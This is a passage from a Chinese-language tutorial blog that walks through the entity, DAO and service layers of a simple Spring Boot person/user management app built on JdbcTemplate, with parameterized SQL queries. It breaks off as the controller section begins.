class="hljs-keyword">return</span> name;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setName</span><span class="hljs-params">(String name)</span> </span>&#123;<br>        <span class="hljs-keyword">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> Integer <span class="hljs-title">getAge</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> age;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setAge</span><span class="hljs-params">(Integer age)</span> </span>&#123;<br>        <span class="hljs-keyword">this</span>.age = age;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">getTeleno</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> teleno;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setTeleno</span><span class="hljs-params">(String teleno)</span> </span>&#123;<br>        <span class="hljs-keyword">this</span>.teleno = teleno;<br>    &#125;<br>&#125;<br><br></code></pre></div></td></tr></table></figure><h5 id="user"><a class="markdownIt-Anchor" href="#user"></a> User</h5><p>User实现类同理</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.zino.ex4spring.domain;<br><br><span class="hljs-keyword">import</span> javax.persistence.Entity;<br><span class="hljs-keyword">import</span> javax.persistence.Id;<br><span class="hljs-keyword">import</span> javax.persistence.Table;<br><br><span class="hljs-meta">@Table(name = &quot;users&quot;)</span><br><span class="hljs-meta">@Entity</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span> </span>&#123;<br>    <span class="hljs-meta">@Id</span><br>    <span class="hljs-keyword">private</span> String username;<br>    <span class="hljs-keyword">private</span> String pass;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">User</span><span class="hljs-params">()</span></span>&#123;<br><br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">User</span><span class="hljs-params">(String username, String pass)</span> </span>&#123;<br>        setUsername(username);<br>        setPass(pass);<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">getUsername</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> username;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setUsername</span><span class="hljs-params">(String username)</span> </span>&#123;<br>        <span class="hljs-keyword">this</span>.username = username;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">getPass</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> pass;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setPass</span><span class="hljs-params">(String pass)</span> </span>&#123;<br>        <span class="hljs-keyword">this</span>.pass = pass;<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><h4 id="2-实现dao"><a class="markdownIt-Anchor" href="#2-实现dao"></a> 2. 实现dao</h4><h5 id="persondao"><a class="markdownIt-Anchor" href="#persondao"></a> PersonDao</h5><p>添加@Repository注解,表示其为一个组件，之后可以通过注解注入</p><p>同时为JdbcTemplate添加@Autowired注解，这样之后构建时spring boot就会自动将JdbcTemplate注入进去了，不需要我们自己new。</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.zino.ex4spring.repository;<br><br><span class="hljs-keyword">import</span> com.zino.ex4spring.domain.Person;<br><span class="hljs-keyword">import</span> org.springframework.beans.factory.annotation.Autowired;<br><span class="hljs-keyword">import</span> org.springframework.jdbc.core.JdbcTemplate;<br><span class="hljs-keyword">import</span> org.springframework.jdbc.core.RowMapper;<br><span class="hljs-keyword">import</span> org.springframework.stereotype.Repository;<br><br><span class="hljs-keyword">import</span> java.sql.ResultSet;<br><span class="hljs-keyword">import</span> java.sql.SQLException;<br><span class="hljs-keyword">import</span> java.util.List;<br><span class="hljs-meta">@Repository</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">PersonDao</span> </span>&#123;<br>    <span class="hljs-meta">@Autowired</span><br>    <span class="hljs-keyword">private</span> JdbcTemplate jdbcTemplate;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 新增</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> Person <span class="hljs-title">insert</span><span class="hljs-params">(Person person)</span> </span>&#123;<br>        String sql=<span class="hljs-string">&quot;insert into person values (?,?,?,?)&quot;</span>;<br>        jdbcTemplate.update(sql, person.getUsername(), person.getName(), person.getAge(),person.getTeleno());<br>        <span class="hljs-keyword">return</span> person;<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 删除</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">delete</span><span class="hljs-params">(String username)</span> </span>&#123;<br>        String sql=<span class="hljs-string">&quot;delete from person where username = ?&quot;</span>;<br>        jdbcTemplate.update(sql, username);<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 更新</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">update</span><span class="hljs-params">(Person person)</span> </span>&#123;<br>        String sql=<span class="hljs-string">&quot;UPDATE person SET name=?, age=?, teleno=? WHERE username=?&quot;</span>;<br>        jdbcTemplate.update(sql, person.getName(), person.getAge(), person.getTeleno(), person.getUsername());<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 按username查询</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> List&lt;Person&gt; <span class="hljs-title">getByUsername</span><span class="hljs-params">(String username)</span> </span>&#123;<br>        String sql=<span class="hljs-string">&quot;select * from person where username=?&quot;</span>;<br>        <span class="hljs-keyword">return</span> jdbcTemplate.query(sql, <span class="hljs-keyword">new</span> RowMapper&lt;Person&gt;() &#123;<br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-function"><span class="hljs-keyword">public</span> Person <span class="hljs-title">mapRow</span><span class="hljs-params">(ResultSet rs, <span class="hljs-keyword">int</span> rowNum)</span> <span class="hljs-keyword">throws</span> SQLException </span>&#123;<br>                Person person = <span class="hljs-keyword">new</span> Person();<br>                person.setUsername(rs.getString(<span class="hljs-string">&quot;username&quot;</span>));<br>                person.setName(rs.getString(<span class="hljs-string">&quot;name&quot;</span>));<br>                person.setAge(rs.getInt(<span class="hljs-string">&quot;age&quot;</span>));<br>                person.setTeleno(rs.getString(<span class="hljs-string">&quot;teleno&quot;</span>));<br>                <span class="hljs-keyword">return</span> person;<br>            &#125;<br>        &#125;,username);<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 查询person列表</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> List&lt;Person&gt; <span class="hljs-title">getList</span><span class="hljs-params">()</span> </span>&#123;<br>        String sql=<span class="hljs-string">&quot;select * from person&quot;</span>;<br>        <span class="hljs-keyword">return</span> jdbcTemplate.query(sql, <span class="hljs-keyword">new</span> RowMapper&lt;Person&gt;() &#123;<br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-function"><span class="hljs-keyword">public</span> Person <span class="hljs-title">mapRow</span><span class="hljs-params">(ResultSet rs, <span class="hljs-keyword">int</span> rowNum)</span> <span class="hljs-keyword">throws</span> SQLException </span>&#123;<br>                Person person = <span class="hljs-keyword">new</span> Person();<br>                person.setUsername(rs.getString(<span class="hljs-string">&quot;username&quot;</span>));<br>                person.setName(rs.getString(<span class="hljs-string">&quot;name&quot;</span>));<br>                person.setAge(rs.getInt(<span class="hljs-string">&quot;age&quot;</span>));<br>                person.setTeleno(rs.getString(<span class="hljs-string">&quot;teleno&quot;</span>));<br>                <span class="hljs-keyword">return</span> person;<br>            &#125;<br>        &#125;);<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><h5 id="userdao"><a class="markdownIt-Anchor" href="#userdao"></a> UserDao</h5><p>UserDao实现同理</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.zino.ex4spring.repository;<br><br><span class="hljs-keyword">import</span> com.zino.ex4spring.domain.User;<br><span class="hljs-keyword">import</span> org.springframework.beans.factory.annotation.Autowired;<br><span class="hljs-keyword">import</span> org.springframework.jdbc.core.JdbcTemplate;<br><span class="hljs-keyword">import</span> org.springframework.jdbc.core.RowMapper;<br><span class="hljs-keyword">import</span> org.springframework.stereotype.Repository;<br><span class="hljs-keyword">import</span> java.sql.ResultSet;<br><span class="hljs-keyword">import</span> java.sql.SQLException;<br><span class="hljs-keyword">import</span> java.util.List;<br><br><span class="hljs-meta">@Repository</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">UserDao</span> </span>&#123;<br>    <span class="hljs-meta">@Autowired</span><br>    <span class="hljs-keyword">private</span> JdbcTemplate jdbcTemplate;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 新增</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> User <span class="hljs-title">insert</span><span class="hljs-params">(User user)</span> </span>&#123;<br>        String sql=<span class="hljs-string">&quot;insert into users values (?,?)&quot;</span>;<br>        jdbcTemplate.update(sql, user.getUsername(), user.getPass());<br>        <span class="hljs-keyword">return</span> user;<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 删除</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">delete</span><span class="hljs-params">(String username)</span> </span>&#123;<br>        String sql=<span class="hljs-string">&quot;delete from users where username = ?&quot;</span>;<br>        jdbcTemplate.update(sql, username);<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 更新</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">update</span><span class="hljs-params">(User user)</span> </span>&#123;<br>        String sql=<span class="hljs-string">&quot;UPDATE users SET pass=? WHERE username=?&quot;</span>;<br>        jdbcTemplate.update(sql, user.getPass(), user.getUsername());<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 按username查询</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> List&lt;User&gt; <span class="hljs-title">getByUsername</span><span class="hljs-params">(String username)</span> </span>&#123;<br>        String sql=<span class="hljs-string">&quot;select * from users where username=?&quot;</span>;<br>        <span class="hljs-keyword">return</span> jdbcTemplate.query(sql, <span class="hljs-keyword">new</span> RowMapper&lt;User&gt;() &#123;<br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-function"><span class="hljs-keyword">public</span> User <span class="hljs-title">mapRow</span><span class="hljs-params">(ResultSet rs, <span class="hljs-keyword">int</span> rowNum)</span> <span class="hljs-keyword">throws</span> SQLException </span>&#123;<br>                User user = <span class="hljs-keyword">new</span> User();<br>                user.setUsername(rs.getString(<span class="hljs-string">&quot;username&quot;</span>));<br>                user.setPass(rs.getString(<span class="hljs-string">&quot;pass&quot;</span>));<br>                <span class="hljs-keyword">return</span> user;<br>            &#125;<br>        &#125;,username);<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 查询user列表</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> List&lt;User&gt; <span class="hljs-title">getList</span><span class="hljs-params">()</span> </span>&#123;<br>        String sql=<span class="hljs-string">&quot;select * from users&quot;</span>;<br>        <span class="hljs-keyword">return</span> jdbcTemplate.query(sql, <span class="hljs-keyword">new</span> RowMapper&lt;User&gt;() &#123;<br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-function"><span class="hljs-keyword">public</span> User <span class="hljs-title">mapRow</span><span class="hljs-params">(ResultSet rs, <span class="hljs-keyword">int</span> rowNum)</span> <span class="hljs-keyword">throws</span> SQLException </span>&#123;<br>                User user = <span class="hljs-keyword">new</span> User();<br>                user.setUsername(rs.getString(<span class="hljs-string">&quot;username&quot;</span>));<br>                user.setPass(rs.getString(<span class="hljs-string">&quot;pass&quot;</span>));<br>                <span class="hljs-keyword">return</span> user;<br>            &#125;<br>        &#125;);<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="2-业务逻辑层"><a class="markdownIt-Anchor" href="#2-业务逻辑层"></a> 2) 业务逻辑层</h3><h4 id="1-实现service"><a class="markdownIt-Anchor" href="#1-实现service"></a> 1. 实现service</h4><h5 id="personservice"><a class="markdownIt-Anchor" href="#personservice"></a> PersonService</h5><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.zino.ex4spring.service;<br><br><span class="hljs-keyword">import</span> com.zino.ex4spring.domain.Person;<br><span class="hljs-keyword">import</span> org.springframework.stereotype.Service;<br><span class="hljs-keyword">import</span> java.util.List;<br><br><span class="hljs-meta">@Service</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">interface</span> <span class="hljs-title">PersonService</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">insert</span><span class="hljs-params">(Person person)</span></span>;<br>    <span class="hljs-function">List&lt;Person&gt; <span class="hljs-title">getList</span><span class="hljs-params">()</span></span>;<br>    <span class="hljs-function">List&lt;Person&gt; <span class="hljs-title">getByUsername</span><span class="hljs-params">(String username)</span></span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h5 id="userservice"><a class="markdownIt-Anchor" href="#userservice"></a> UserService</h5><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.zino.ex4spring.service;<br><br><span class="hljs-keyword">import</span> com.zino.ex4spring.domain.Person;<br><span class="hljs-keyword">import</span> com.zino.ex4spring.domain.User;<br><span class="hljs-keyword">import</span> java.util.List;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">interface</span> <span class="hljs-title">UserSersive</span>  </span>&#123;<br>    <span class="hljs-function">User <span class="hljs-title">insert</span><span class="hljs-params">(User user)</span></span>;<br>    <span class="hljs-function">List&lt;User&gt; <span class="hljs-title">getList</span><span class="hljs-params">()</span></span>;<br>    <span class="hljs-function">List&lt;User&gt; <span class="hljs-title">getByUsername</span><span class="hljs-params">(String username)</span></span>;<br>    <span class="hljs-function">User <span class="hljs-title">delete</span><span class="hljs-params">(String username)</span></span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h4 id="2-实现serviceimpl"><a class="markdownIt-Anchor" href="#2-实现serviceimpl"></a> 2. 实现serviceImpl</h4><p>这一部分上面的接口的具体实现，实现的是业务逻辑，然后调用上层Dao已经实现的接口</p><h5 id="personserviceimpl"><a class="markdownIt-Anchor" href="#personserviceimpl"></a> PersonServiceImpl</h5><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.zino.ex4spring.service.impl;<br><br><span class="hljs-keyword">import</span> com.zino.ex4spring.domain.Person;<br><span class="hljs-keyword">import</span> com.zino.ex4spring.domain.User;<br><span class="hljs-keyword">import</span> com.zino.ex4spring.repository.PersonDao;<br><span class="hljs-keyword">import</span> com.zino.ex4spring.repository.UserDao;<br><span class="hljs-keyword">import</span> com.zino.ex4spring.service.PersonService;<br><span class="hljs-keyword">import</span> org.springframework.stereotype.Service;<br><br><span class="hljs-keyword">import</span> javax.annotation.Resource;<br><span class="hljs-keyword">import</span> java.util.List;<br><span class="hljs-meta">@Service</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">PersonServiceImpl</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">PersonService</span> </span>&#123;<br>    <span class="hljs-meta">@Resource</span><br>    <span class="hljs-keyword">private</span> PersonDao personDao;<br>    <span class="hljs-meta">@Resource</span><br>    <span class="hljs-keyword">private</span> UserDao userDao;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">insert</span><span class="hljs-params">(Person person)</span> </span>&#123;<br>        <span class="hljs-keyword">int</span> u=userDao.getByUsername(person.getUsername()).size();<br>        <span class="hljs-keyword">int</span> p=personDao.getByUsername(person.getUsername()).size();<br>        <span class="hljs-keyword">if</span>(u!=<span class="hljs-number">0</span>)&#123;<br>            <span class="hljs-keyword">if</span>(p!=<span class="hljs-number">0</span>)&#123;<br>                personDao.update(person);<br>                <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<span class="hljs-comment">//该记录已存在person表和user表，更新person表数据</span><br>            &#125;<br>            <span class="hljs-keyword">else</span> &#123;<br>                personDao.insert(person);<br>                <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<span class="hljs-comment">//该记录已存在users表，不存在person表，插入person表</span><br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-comment">//不存在user，插入user表,user表默认密码为888888</span><br>            userDao.insert(<span class="hljs-keyword">new</span> User(person.getUsername(),<span class="hljs-string">&quot;888888&quot;</span>));<br>            <span class="hljs-keyword">if</span>(p!=<span class="hljs-number">0</span>)&#123;<br>                personDao.update(person);<br>                <span class="hljs-keyword">return</span> <span class="hljs-number">2</span>;<span class="hljs-comment">//该记录不存在user表，存在person表，插入user表，更新person表数据</span><br>            &#125;<br>            <span class="hljs-keyword">else</span> &#123;<br>                personDao.insert(person);<br>                <span class="hljs-keyword">return</span> <span class="hljs-number">3</span>;<span class="hljs-comment">//该记录不存在users表和person表，插入user表和person表</span><br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> List&lt;Person&gt; <span class="hljs-title">getList</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> personDao.getList();<br>    &#125;<br><br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> List&lt;Person&gt; <span class="hljs-title">getByUsername</span><span class="hljs-params">(String username)</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> personDao.getByUsername(username);<br>    &#125;<br>&#125;<br><br></code></pre></div></td></tr></table></figure><h5 id="userserviceimpl"><a class="markdownIt-Anchor" href="#userserviceimpl"></a> UserServiceImpl</h5><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.zino.ex4spring.service.impl;<br><br><span class="hljs-keyword">import</span> com.zino.ex4spring.domain.User;<br><span class="hljs-keyword">import</span> com.zino.ex4spring.repository.PersonDao;<br><span class="hljs-keyword">import</span> com.zino.ex4spring.repository.UserDao;<br><span class="hljs-keyword">import</span> com.zino.ex4spring.service.UserSersive;<br><span class="hljs-keyword">import</span> org.springframework.stereotype.Service;<br><br><span class="hljs-keyword">import</span> javax.annotation.Resource;<br><span class="hljs-keyword">import</span> java.util.List;<br><span class="hljs-meta">@Service</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">UserServiceImpl</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">UserSersive</span> </span>&#123;<br>    <span class="hljs-meta">@Resource</span><br>    <span class="hljs-keyword">private</span> PersonDao personDao;<br>    <span class="hljs-meta">@Resource</span><br>    <span class="hljs-keyword">private</span> UserDao userDao;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> User <span class="hljs-title">insert</span><span class="hljs-params">(User user)</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> userDao.insert(user);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> List&lt;User&gt; <span class="hljs-title">getList</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> userDao.getList();<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> List&lt;User&gt; <span class="hljs-title">getByUsername</span><span class="hljs-params">(String username)</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> userDao.getByUsername(username);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> User <span class="hljs-title">delete</span><span class="hljs-params">(String username)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span>(userDao.getByUsername(username).size()!=<span class="hljs-number">0</span>)&#123;<br>            userDao.delete(username);<br>            personDao.delete(username);<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> User(username,<span class="hljs-string">&quot;******&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;<br>    &#125;<br>&#125;<br><br></code></pre></div></td></tr></table></figure><h3 id="3-控制层"><a class="markdownIt-Anchor" href="#3-控制层"></a> 3) 控制层</h3><h4 id="personcontroller"><a class="markdownIt-Anchor" href="#personcontroller"></a> PersonController</h4><ul><li>注解<code>@RequestMapping</code>中的”/person”是这个控制器类的基路由</li><li><code>@PostMapping(&quot;/add&quot;)</code>表示处理post请求，路由为/perosn/add</li><li><code>@GetMapping(&quot;/list&quot;)</code>表示处理get请求，路由为/person/list</li></ul><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span 